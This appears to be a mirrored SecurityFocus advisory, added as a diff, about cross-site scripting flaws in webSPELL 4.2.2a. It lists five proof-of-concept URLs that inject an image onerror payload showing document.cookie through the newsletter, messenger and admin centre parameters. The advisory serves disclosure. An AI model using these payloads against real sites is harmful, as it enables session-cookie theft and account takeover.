@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/47500/info
+
+webSPELL is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+webSPELL 4.2.2a is affected; other versions may also be vulnerable. 
+
+
+http://www.example.com/index.php?site=newsletter&pass=1%22%3E%3Cimg%20src=1.png%20onerror=alert%28document.cookie%29%3E
+http://www.example.com/index.php?site=messenger&action=touser&touser=1%22%3E%3Cimg%20src=1.png%20onerror=alert%28document.cookie%29%3E
+http://www.example.com/admin/admincenter.php?site=users&action=addtoclan&id=1&page=1%22%3E%3Cimg%20src=1.png%20onerror=alert%28document.cookie%29%3E
+http://www.example.com/admin/admincenter.php?site=squads&action=edit&squadID=1%22%3E%3Cimg%20src=1.png%20onerror=alert%28document.cookie%29%3E
+http://www.example.com/admin/admincenter.php?site=contact&action=edit&contactID=1%22%3E%3Cimg%20src=1.png%20onerror=alert%28document.cookie%29%3E 
